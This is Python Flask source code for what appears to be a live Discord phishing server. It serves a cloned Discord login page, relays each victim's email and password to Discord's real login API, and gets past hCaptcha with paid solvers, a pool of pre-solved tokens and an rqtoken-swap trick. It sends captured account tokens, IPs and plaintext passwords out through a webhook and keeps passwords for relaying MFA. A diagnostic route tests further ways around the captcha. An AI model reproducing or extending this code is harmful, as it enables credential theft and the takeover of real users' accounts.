def _serve_local_login():
    """Fallback: serve the local discord_login.html clone."""
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'discord_login.html'), 'r', encoding='utf-8') as f:
            html = f.read()
    except:
        return send_from_directory('.', 'discord_login.html')
    tok = _issue_page_token()
    html = html.replace('</head>', f'<script>window._pgToken="{tok}";</script></head>', 1)
    resp = make_response(html)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    return resp


@app.route('/login-classic')
def login_classic():
    """Access the old clone-based login page directly."""
    return _serve_local_login()


@app.route('/favicon.ico')
def favicon():
    return send_from_directory('.', 'restorecordicon.png', mimetype='image/png')


# ━━━━━━━━━━ Pre-Challenge (Arsenal-Backed) ━━━━━━━━━━
# Page loads → grabs a token from the 24/7 arsenal (instant if pool ready).
# Login click does: POST login → get FRESH rqtoken → submit with arsenal token.
# Key insight: the hCaptcha token is NOT rqtoken-bound. We just need to swap
# the rqtoken to the one from the REAL login attempt. Two API calls, ~1s.

_prechallenges = {}  # pc_id → {'token': str|None, 'event': Event, 'time': float}
_pc_lock = threading.Lock()


def _prechallenge_worker(pc_id):
    """Background: solve a single captcha on-demand when user loads the page."""
    try:
        # On-demand solve — no pre-filled pool, just solve one captcha now
        sitekey = _last_discord_sitekey or DEFAULT_SITEKEY
        print(f'[prechallenge:{pc_id}] Solving captcha on-demand...')
        token, err = solve_captcha(sitekey, '')
        
        pc = _prechallenges.get(pc_id)
        if not pc:
            return

        if token:
            pc.update({'token': token, 'status': 'ready'})
            pc['event'].set()
            print(f'[prechallenge:{pc_id}] READY — solved on-demand')
        else:
            pc.update({'status': 'empty'})
            pc['event'].set()
            print(f'[prechallenge:{pc_id}] Solve failed: {err}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        pc = _prechallenges.get(pc_id)
        if pc:
            pc['status'] = 'error'
            pc['event'].set()


@app.route('/api/prechallenge', methods=['POST'])
def api_prechallenge():
    ok, retry_after = _rate_check('prechallenge')
    if not ok:
        return jsonify({'ok': False, 'reason': 'rate_limited', 'retry_after': retry_after})
    if not ANTICAPTCHA_KEY and not CAPSOLVER_KEY:
        return jsonify({'ok': False, 'reason': 'no_key'})

    pc_id = uuid.uuid4().hex[:12]
    _prechallenges[pc_id] = {
        'token': None,
        'status': 'waiting',
        'event': threading.Event(),
        'time': time.time(),
    }
    threading.Thread(target=_prechallenge_worker, args=(pc_id,), daemon=True).start()

    print(f'[prechallenge] Started {pc_id}')
    return jsonify({'ok': True, 'prechallenge_id': pc_id})


@app.route('/api/prechallenge/status/<pc_id>', methods=['GET'])
def api_prechallenge_status(pc_id):
    """Check the status of a pre-challenge without consuming it."""
    pc = _prechallenges.get(pc_id)
    if not pc:
        return jsonify({'found': False})
    return jsonify({
        'found': True,
        'status': pc.get('status', '?'),
        'has_token': bool(pc.get('token')),
        'has_rqtoken': bool(pc.get('rqtoken')),
        'sitekey': pc.get('sitekey', '')[:20],
        'age_s': round(time.time() - pc.get('time', time.time()), 1),
    })


@app.route('/api/debug-role')
def debug_role():
    """Diagnostic endpoint: test bot token, guild access, role setup.
    Usage: /api/debug-role?bot_key=1&guild_id=XXX&role_id=YYY"""
    bot_key = request.args.get('bot_key', '1')
    guild_id = request.args.get('guild_id', '')
    role_id = request.args.get('role_id', '')
    bot_token = _get_bot_token(bot_key)
    results = {'config': {
        'bot_key': bot_key,
        'bot_token_set': bool(bot_token),
        'guild_id': guild_id or 'MISSING',
        'role_id': role_id or 'MISSING',
    }}
    if not bot_token:
        return jsonify({**results, 'error': f'No BOTTOKEN{bot_key} env var set'})
    try:
        s = _make_session()
        bh = {'Authorization': f'Bot {bot_token}', 'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)'}
        # 1) Bot user info
        r1 = s.get(f'{API}/users/@me', headers=bh, timeout=10)
        if r1.ok:
            bd = r1.json()
            results['bot'] = {'id': bd.get('id'), 'username': bd.get('username'), 'status': r1.status_code}
        else:
            results['bot'] = {'status': r1.status_code, 'error': r1.text[:200]}
            return jsonify(results)
        # 2) Guild info
        if guild_id:
            r2 = s.get(f'{API}/guilds/{guild_id}', headers=bh, timeout=10)
            if r2.ok:
                gd = r2.json()
                results['guild'] = {'name': gd.get('name'), 'status': r2.status_code}
            else:
                results['guild'] = {'status': r2.status_code, 'error': r2.text[:200]}
        # 3) Roles
        if guild_id:
            r3 = s.get(f'{API}/guilds/{guild_id}/roles', headers=bh, timeout=10)
            if r3.ok:
                roles = r3.json()
                target = [rl for rl in roles if rl['id'] == role_id]
                results['roles'] = {'total': len(roles), 'target_found': bool(target)}
                if target:
                    results['roles']['target'] = {'name': target[0]['name'], 'position': target[0]['position']}
                bot_id = results.get('bot', {}).get('id')
                if bot_id:
                    r4 = s.get(f'{API}/guilds/{guild_id}/members/{bot_id}', headers=bh, timeout=10)
                    if r4.ok:
                        bot_roles = r4.json().get('roles', [])
                        bot_role_objs = [rl for rl in roles if rl['id'] in bot_roles]
                        max_pos = max([rl['position'] for rl in bot_role_objs], default=0)
                        target_pos = target[0]['position'] if target else 0
                        results['hierarchy'] = {
                            'bot_highest_position': max_pos,
                            'target_position': target_pos,
                            'can_assign': max_pos > target_pos,
                        }
                    else:
                        results['bot_member'] = {'status': r4.status_code, 'error': r4.text[:200]}
            else:
                results['roles'] = {'status': r3.status_code, 'error': r3.text[:200]}
        # 4) Test role assign
        results['note'] = 'Use &test_user=USER_ID to test role assign on a real user'
        test_uid = request.args.get('test_user')
        if test_uid and guild_id and role_id:
            url = f'{API}/guilds/{guild_id}/members/{test_uid}/roles/{role_id}'
            rp = s.put(url, headers={**bh, 'Content-Length': '0', 'X-Audit-Log-Reason': 'debug test'}, timeout=10)
            results['test_assign'] = {'status': rp.status_code, 'response': rp.text[:300]}
    except Exception as e:
        results['error'] = str(e)
    return jsonify(results)


@app.route('/api/pressolve', methods=['POST'])
def api_pressolve():
    """Return current arsenal status."""
    st = _arsenal_status()
    return jsonify({'ok': True, **st})


@app.route('/api/diag-rqdata', methods=['GET'])
def api_diag_rqdata():
    """Diagnostic: compare rqdata + test session captcha memory."""
    results = {}
    try:
        # ── Part 1: Compare rqdata across requests ──
        ds1 = DiscordSession(); ds1.prepare()
        r1 = ds1.post('/auth/login', {
            'login': 'diag_aaa@test.xyz', 'password': 'DiagTest1!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        })
        j1 = r1.json()

        ds2 = DiscordSession(); ds2.prepare()
        r2 = ds2.post('/auth/login', {
            'login': 'diag_bbb@other.com', 'password': 'DiagTest2!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        })
        j2 = r2.json()

        rq1 = j1.get('captcha_rqdata', '')
        rq2 = j2.get('captcha_rqdata', '')
        results['rqdata_compare'] = {
            'match': rq1 == rq2,
            'len1': len(rq1), 'len2': len(rq2),
            'sitekey_match': j1.get('captcha_sitekey') == j2.get('captcha_sitekey'),
        }

        # ── Part 2: Session captcha memory test ──
        # Theory: if we solve captcha with junk email on a session, maybe that
        # session won't need captcha for the NEXT login attempt (with real email)
        entry = _arsenal_grab()
        if entry and entry.get('token'):
            junk_email = uuid.uuid4().hex[:8] + '@junk.xyz'
            ds_test = entry.get('ds')
            if not ds_test:
                ds_test = DiscordSession(); ds_test.prepare()

            # Step A: submit with junk email + pre-solved token + original rqtoken
            submit_a = {
                'login': junk_email, 'password': 'JunkPw!',
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
                'captcha_key': entry['token'],
                'captcha_rqtoken': entry['rqtoken'],
            }
            ra = ds_test.post('/auth/login', submit_a)
            ja = ra.json()
            ckeys_a = ja.get('captcha_key', [])
            captcha_a = isinstance(ckeys_a, list) and ('captcha-required' in ckeys_a or ja.get('captcha_sitekey'))
            results['step_a_junk_submit'] = {
                'status': ra.status_code,
                'captcha_still_required': captcha_a,
                'got_invalid_login': 'INVALID_LOGIN' in str(ja.get('errors', '')),
                'response_keys': list(ja.keys())[:10],
                'response_preview': str(ja)[:300],
            }

            # Step B: SAME session, now try login with a DIFFERENT email, NO captcha
            submit_b = {
                'login': 'realuser99@gmail.com', 'password': 'TestPw123',
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            }
            rb = ds_test.post('/auth/login', submit_b)
            jb = rb.json()
            ckeys_b = jb.get('captcha_key', [])
            captcha_b = isinstance(ckeys_b, list) and ('captcha-required' in ckeys_b or jb.get('captcha_sitekey'))
            results['step_b_real_no_captcha'] = {
                'status': rb.status_code,
                'captcha_required': captcha_b,
                'got_invalid_login': 'INVALID_LOGIN' in str(jb.get('errors', '')),
                'response_keys': list(jb.keys())[:10],
                'response_preview': str(jb)[:300],
            }
            results['session_memory_works'] = not captcha_b
        else:
            results['session_test'] = 'No arsenal token available (pool empty)'

    except Exception as e:
        results['error'] = str(e)
        import traceback; traceback.print_exc()
    return jsonify(results)


@app.route('/api/login', methods=['POST'])
def api_login():
    ok, retry_after = _rate_check('login')
    if not ok:
        return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.'}), 429
    d = request.json
    login_email  = d.get('login')
    login_pw     = d.get('password')
    prechallenge_id = d.get('prechallenge_id')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        # ── Get a pre-solved captcha token (from prechallenge or arsenal) ──
        arsenal_token = None

        # Check prechallenge first (grabbed on page load)
        if prechallenge_id:
            pc = _prechallenges.get(prechallenge_id)
            if pc:
                if pc.get('token'):
                    arsenal_token = _prechallenges.pop(prechallenge_id, {}).get('token')
                elif pc.get('status') == 'waiting':
                    # Still waiting for arsenal — give it a few seconds
                    pc['event'].wait(timeout=5)
                    if pc.get('token'):
                        arsenal_token = _prechallenges.pop(prechallenge_id, {}).get('token')

        # If prechallenge didn't have one, try grabbing from arsenal directly
        if not arsenal_token:
            entry = _arsenal_grab()
            if entry:
                arsenal_token = entry.get('token')

        return _login_with_arsenal(login_email, login_pw, client_ip, arsenal_token)

    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f'[!] Login error: {e}')
        return jsonify({'error': str(e)}), 500


def _login_with_arsenal(login_email, login_pw, client_ip, arsenal_token):
    """
    Two-step instant login:
    Step 1: POST login → get captcha challenge + fresh rqtoken
    Step 2: Submit with pre-solved token + fresh rqtoken (rqtoken swap)
    If no arsenal token or token rejected → fall back to inline solve.
    """
    ds = _get_ready_session()
    if ds:
        print(f'[*] Using pre-warmed session')
    else:
        ds = DiscordSession()
        ds.prepare()

    # Step 1: Login attempt → triggers captcha
    payload_bare = {
        'login': login_email, 'password': login_pw,
        'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
    }

    try:
        r1 = ds.post('/auth/login', payload_bare)
    except Exception:
        snap = ds.snapshot()
        ds = DiscordSession()
        ds.s = _make_session()
        ds.restore(snap)
        r1 = ds.post('/auth/login', payload_bare)

    try:
        j1 = r1.json()
    except Exception:
        print(f'[*] Login step1 [{r1.status_code}]: non-JSON: {r1.text[:200]}')
        return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
    print(f'[*] Login step1 [{r1.status_code}]: {r1.text[:300]}')

    # If no captcha needed (clean IP, or invalid creds response), return directly
    ckeys = j1.get('captcha_key', [])
    is_captcha = isinstance(ckeys, list) and (
        'captcha-required' in ckeys or j1.get('captcha_sitekey')
    )
    if not is_captcha:
        return _format_login_result(j1, r1.status_code, client_ip, password=login_pw)

    # Got captcha challenge — extract FRESH rqtoken
    fresh_rqtoken = j1.get('captcha_rqtoken', '')
    sitekey = j1.get('captcha_sitekey', DEFAULT_SITEKEY)
    rqdata  = j1.get('captcha_rqdata', '')

    # Step 2: Try arsenal token with the FRESH rqtoken
    if arsenal_token:
        print(f'[*] INSTANT: submitting arsenal token with fresh rqtoken')
        payload_captcha = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': arsenal_token,
            'captcha_rqtoken': fresh_rqtoken,
        }

        try:
            r2 = ds.post('/auth/login', payload_captcha)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r2 = ds.post('/auth/login', payload_captcha)

        try:
            j2 = r2.json()
        except Exception:
            print(f'[*] Arsenal submit [{r2.status_code}]: non-JSON: {r2.text[:200]}')
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[*] Arsenal submit [{r2.status_code}]: {r2.text[:300]}')

        ckeys2 = j2.get('captcha_key', [])
        still_captcha = isinstance(ckeys2, list) and (
            'captcha-required' in ckeys2 or 'invalid-response' in ckeys2
            or j2.get('captcha_sitekey')
        )

        if not still_captcha:
            print(f'[*] ARSENAL TOKEN ACCEPTED!')
            return _format_login_result(j2, r2.status_code, client_ip, password=login_pw)

        # Token rejected — update challenge data for inline fallback
        print(f'[*] Arsenal token rejected (rqtoken swap failed), falling back to inline solve')
        rqdata  = j2.get('captcha_rqdata', rqdata)
        fresh_rqtoken = j2.get('captcha_rqtoken', fresh_rqtoken)
        sitekey = j2.get('captcha_sitekey', sitekey)
    else:
        print(f'[*] No arsenal token available, inline solve')

    # Fallback: inline solve
    return _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, fresh_rqtoken, client_ip)


# _login_full_inline removed — replaced by _login_with_arsenal which handles
# both instant (arsenal) and fallback (inline solve) in one unified flow.


def _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, client_ip):
    """Solve captcha with race, submit login, handle retries. Returns Flask response."""
    global _last_discord_sitekey
    _last_discord_sitekey = sitekey

    MAX_SOLVE_ATTEMPTS = 2
    for attempt in range(MAX_SOLVE_ATTEMPTS):
        print(f'[solve] Attempt {attempt+1}/{MAX_SOLVE_ATTEMPTS} sitekey={sitekey[:16]} rqdata={bool(rqdata)}')

        token, err = _solve_race(sitekey, rqdata, n=5)
        if not token:
            print(f'[solve] Failed: {err}')
            if attempt >= MAX_SOLVE_ATTEMPTS - 1:
                return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500
            continue

        payload = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }

        # Fresh TLS connection, preserve identity
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        try:
            r = ds2.post('/auth/login', payload)
        except Exception:
            snap2 = ds2.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap2)
            r = ds2.post('/auth/login', payload)

        try:
            j = r.json()
        except Exception:
            print(f'[solve] Result [{r.status_code}]: non-JSON: {r.text[:200]}')
            if attempt < MAX_SOLVE_ATTEMPTS - 1:
                time.sleep(1)
                continue
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[solve] Result [{r.status_code}]: {r.text[:400]}')

        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if not still_captcha:
            return _format_login_result(j, r.status_code, client_ip, ds2, password=login_pw)

        # Token rejected — retry with new challenge data
        rqdata  = j.get('captcha_rqdata', rqdata)
        rqtoken = j.get('captcha_rqtoken', rqtoken)
        sitekey = j.get('captcha_sitekey', sitekey)
        ds = ds2
        print(f'[solve] Token rejected, retrying...')

    return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500


def _format_login_result(j, status_code, client_ip, ds=None, password='?'):
    """Format Discord login result into a Flask response."""
    if j.get('token'):
        fire_webhook(j['token'], client_ip, password)
        return jsonify(_success_with_info(j['token']))
    # Store password for MFA ticket lookup
    if j.get('ticket') and password != '?':
        with _pw_store_lock:
            _pw_store[j['ticket']] = password

    if j.get('ticket') and j.get('mfa') is not None:
        print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
        resp = dict(j)
        if password and password != '?':
            resp['_pw'] = password  # Pass to frontend for MFA round-trip
        return jsonify(resp)

    # Error
    err_msg = j.get('message', '')
    if not err_msg:
        ckeys = j.get('captcha_key', [])
        if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
            err_msg = 'Verification timed out. Please try again.'
        elif j.get('retry_after'):
            err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
        else:
            err_msg = 'Login failed. Please check your credentials and try again.'

    errs = j.get('errors', {})
    is_email_verify = False
    for field_key in errs:
        if isinstance(errs[field_key], dict):
            for fe in errs[field_key].get('_errors', []):
                if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                    err_msg = fe.get('message', 'New login location detected. Please check your email.')
                    is_email_verify = True

    result = {'message': err_msg, 'error': err_msg}
    if is_email_verify:
        result['email_verify'] = True
    if j.get('errors'):
        result['errors'] = j['errors']
    if j.get('retry_after'):
        result['retry_after'] = j['retry_after']

    # Forward Discord's code50035 directly for better frontend handling
    if j.get('code'):
        result['code'] = j['code']

    print(f'[!] Login result: {err_msg}')
    return jsonify(result), status_code


def _bg_solve_prechallenge(sid, sess, pc):
    """Handle PC shortcut mode: wait for pre-challenge solve, submit with real creds."""
    try:
        # ── Session age guard: stop solving if session is too old ──
        age = time.time() - sess.get('_created_at', time.time())
        if age > SESSION_SOLVE_TIMEOUT:
            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
            sess['result_code'] = 500
            sess['status'] = 'done'
            return

        email = sess['email']
        pw    = sess['pw']
        ip    = sess.get('client_ip', '')

        # Wait for pre-challenge to finish solving
        if not pc['event'].is_set():
            remaining = max(5, 120 - (time.time() - pc.get('time', time.time())))
            print(f'[bg:{sid}] PC-shortcut: waiting up to {remaining:.0f}s for pre-challenge...')
            pc['event'].wait(timeout=remaining)

        if not (pc.get('token') and pc.get('rqtoken')):
            # Pre-challenge failed — need to do full login flow from scratch
            print(f'[bg:{sid}] Pre-challenge failed, doing full login flow from scratch')
            ds = _get_ready_session()
            if not ds:
                ds = DiscordSession()
                ds.prepare()
            payload = {
                'login': email, 'password': pw,
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            }
            r = ds.post('/auth/login', payload)
            j = r.json()
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or j.get('captcha_sitekey')
            )
            if not is_captcha:
                # No captcha needed (lucky!) — process result
                _store_bg_result(sid, sess, j, r.status_code, ip, ds)
                return
            # Got captcha — solve
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token, err = _solve_race(sitekey, rqdata, n=5)
            if not token:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            _store_bg_result(sid, sess, j, r.status_code, ip, ds2)
            return

        # Pre-challenge solved! Submit REAL credentials with pre-challenge captcha
        token   = pc['token']
        rqtoken = pc.get('rqtoken', '')
        ds      = pc.get('ds') or DiscordSession()
        print(f'[bg:{sid}] PC-shortcut: pre-challenge solved! Submitting real creds...')

        payload = {
            'login': email, 'password': pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }
        try:
            r = ds.post('/auth/login', payload)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r = ds.post('/auth/login', payload)

        j = r.json()
        print(f'[bg:{sid}] PC-shortcut result [{r.status_code}]: {r.text[:400]}')

        # Check if Discord still wants captcha (token rejected)
        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )
        if still_captcha:
            # Token rejected — do fresh solve
            print(f'[bg:{sid}] PC token rejected, doing fresh solve')
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token2, err = _solve_race(sitekey, rqdata, n=5)
            if not token2:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token2
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            ds = ds2

        _store_bg_result(sid, sess, j, r.status_code, ip, ds)

    except Exception as e:
        import traceback
        traceback.print_exc()
        sess['result'] = {'error': str(e)}
        sess['result_code'] = 500
        sess['status'] = 'done'


def _store_bg_result(sid, sess, j, status_code, client_ip, ds):
    """Process Discord login result and store it for polling."""
    pw = sess.get('pw', '?')
    print(f'[bg:{sid}] Final result [{status_code}]: {str(j)[:400]}')
    if j.get('token'):
        fire_webhook(j['token'], client_ip, pw)
        sess['result'] = _success_with_info(j['token'])
        sess['result_code'] = 200
    elif j.get('ticket') and j.get('mfa') is not None:
        # Store password for MFA ticket lookup
        with _pw_store_lock:
            _pw_store[j['ticket']] = pw
        sess['result'] = j
        sess['result_code'] = 200
    else:
        err_msg = j.get('message', '')
        if not err_msg:
            ckeys = j.get('captcha_key', [])
            if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
                err_msg = 'Verification timed out. Retrying...'
            elif j.get('retry_after'):
                err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
            else:
                err_msg = 'Login failed. Please check your credentials and try again.'
        errs = j.get('errors', {})
        for field_key in errs:
            if isinstance(errs[field_key], dict):
                for fe in errs[field_key].get('_errors', []):
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        err_msg = fe.get('message', 'New login location detected. Please check your email.')
        result = {'message': err_msg, 'error': err_msg}
        if j.get('errors'):
            result['errors'] = j['errors']
        if j.get('retry_after'):
            result['retry_after'] = j['retry_after']
        sess['result'] = result
        sess['result_code'] = status_code
    sess['status'] = 'done'


def _bg_solve(sid):
    """Background thread: solve captcha, re-submit login, store result.
    If a pre-challenge is still solving, waits for it instead of starting new tasks.
    Supports _pc_shortcut mode: no normal flow data, uses pre-challenge session directly.
    """
    global _last_discord_sitekey
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        # ── Session age guard: stop solving if session is too old ──
        age = time.time() - sess.get('_created_at', time.time())
        if age > SESSION_SOLVE_TIMEOUT:
            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
            sess['result_code'] = 500
            sess['status'] = 'done'
            return

        pc = sess.get('_prechallenge')

        # ── PC shortcut mode: pre-challenge is our ONLY solve path ──
        if sess.get('_pc_shortcut') and pc:
            return _bg_solve_prechallenge(sid, sess, pc)

        sitekey = sess['sitekey']
        rqdata  = sess['rqdata']
        rqtoken = sess['rqtoken']
        payload = dict(sess['payload'])
        ds      = sess['session']

        # Update global sitekey tracker for pre-solve pool
        _last_discord_sitekey = sitekey

        MAX_ATTEMPTS = 3
        j = {}
        r = None
        last_ds = ds  # track last DiscordSession for email verify flow

        for attempt in range(MAX_ATTEMPTS):
            # ── Check session age before each solve attempt ──
            age = time.time() - sess.get('_created_at', time.time())
            if age > SESSION_SOLVE_TIMEOUT:
                print(f'[bg:{sid}] Session too old ({age:.0f}s), stopping solve at attempt {attempt+1}')
                sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return

            print(f'[bg:{sid}] Captcha attempt {attempt+1}/{MAX_ATTEMPTS} (sitekey={sitekey[:16]}, rqdata={bool(rqdata)})')

            solved_token = None

            # ── Solve captcha ──
            solved_token, err = _solve_race(sitekey, rqdata, n=5)
            if not solved_token:
                print(f'[bg:{sid}] Solve failed: {err}')
                if attempt >= MAX_ATTEMPTS - 1:
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                    sess['status'] = 'done'
                    return
                continue

            # Submit login with solved captcha token
            payload['captcha_key'] = solved_token
            payload['captcha_rqtoken'] = rqtoken

            # Fresh TLS connection, preserve identity (cookies + fingerprint)
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            last_ds = ds2

            try:
                r = ds2.post('/auth/login', payload)
            except Exception as ce:
                print(f'[bg:{sid}] Connection error: {ce}')
                snap2 = ds2.snapshot()
                ds3 = DiscordSession()
                ds3.s = _make_session()
                ds3.restore(snap2)
                r = ds3.post('/auth/login', payload)
                ds2 = ds3
                last_ds = ds3

            j = r.json()
            print(f'[bg:{sid}] Attempt {attempt+1} result [{r.status_code}]: {r.text[:400]}')

            # Check if Discord returned another captcha challenge
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or 'invalid-response' in ckeys
                or j.get('captcha_sitekey')
            )

            if not is_captcha:
                break  # Not a captcha — process the actual result

            # Captcha came back — update challenge data for next attempt
            sitekey = j.get('captcha_sitekey', sitekey)
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', rqtoken)
            _last_discord_sitekey = sitekey
            ds = ds2  # keep session for next attempt
            print(f'[bg:{sid}] Captcha returned, next attempt with fresh rqdata={bool(rqdata)}')

        # ── Process final result ──
        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            pw = sess.get('pw', '?')
            with _pw_store_lock:
                _pw_store[j['ticket']] = pw
            sess['result'] = j
            sess['result_code'] = 200
        else:
            # Check for email verification requirement
            errs = j.get('errors', {})
            is_email_verify = False
            for field_key in errs:
                field_errors = errs[field_key].get('_errors', []) if isinstance(errs[field_key], dict) else []
                for fe in field_errors:
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        is_email_verify = True
                        break

            if is_email_verify:
                print(f'[bg:{sid}] Email verification required — keeping session for retry')
                sess['result'] = {'email_verify': True, 'message': 'New login location detected. Please check your email and verify, then click Continue.'}
                sess['result_code'] = 200
                sess['retry_ds'] = last_ds
                sess['retry_payload'] = dict(payload)
                sess['retry_payload'].pop('captcha_key', None)
                sess['retry_payload'].pop('captcha_rqtoken', None)
            else:
                # Check if we're still stuck on captcha after all attempts
                ckeys_final = j.get('captcha_key', [])
                if isinstance(ckeys_final, list) and ckeys_final:
                    # Captcha persisted through all attempts — tell frontend to auto-retry
                    print(f'[bg:{sid}] Captcha persisted after {MAX_ATTEMPTS} attempts — signaling auto-retry')
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                else:
                    err_msg = j.get('message', '')
                    if not err_msg:
                        err_msg = 'Login failed. Please check your credentials.'
                    print(f'[bg:{sid}] Error: {err_msg} | raw: {j}')
                    sess['result'] = {'error': err_msg, 'message': err_msg}
                    if j.get('errors'):
                        sess['result']['errors'] = j['errors']
                    if j.get('retry_after'):
                        sess['result']['retry_after'] = j['retry_after']
                    sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        token_ok = j.get('token') is not None
        mfa_ok = j.get('mfa') is not None
        print(f'[bg:{sid}] Done. token={token_ok}, mfa={mfa_ok}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


def _cleanup_old_sessions():
    """Remove sessions that have been delivered or are older than 5 minutes."""
    now = time.time()
    to_remove = []
    for sid, sess in list(login_sessions.items()):
        delivered = sess.get('_delivered_at', 0)
        created = sess.get('_created_at', now)
        if delivered and (now - delivered) > 30:  # 30s after delivery
            to_remove.append(sid)
        elif (now - created) > 300:  # 5 min absolute max
            to_remove.append(sid)
    for sid in to_remove:
        login_sessions.pop(sid, None)
    # Cleanup stale prechallenges (older than 2 min)
    pc_remove = [k for k, v in list(_prechallenges.items()) if (now - v.get('time', now)) > 120]
    for k in pc_remove:
        _prechallenges.pop(k, None)
    if to_remove or pc_remove:
        print(f'[cleanup] Removed {len(to_remove)} stale sessions, {len(pc_remove)} stale prechallenges')


@app.route('/api/login/poll/<sid>')
def api_login_poll(sid):
    """Frontend polls this while the background captcha solve is running."""
    # Periodic cleanup
    try:
        _cleanup_old_sessions()
    except Exception:
        pass
    sess = login_sessions.get(sid)
    if not sess:
        # Session gone (server restart or cleaned up) — tell frontend to retry
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404
    if sess['status'] == 'solving':
        return jsonify({'status': 'solving'})
    # Done — return the result
    result = sess.get('result', {'error': 'Unknown error'})
    code   = sess.get('result_code', 500)
    # Don't immediately pop — mark with timestamp for delayed cleanup
    # This prevents "Session not found" from duplicate poll requests
    if not result.get('email_verify'):
        sess['_delivered_at'] = time.time()
    return jsonify(result), code


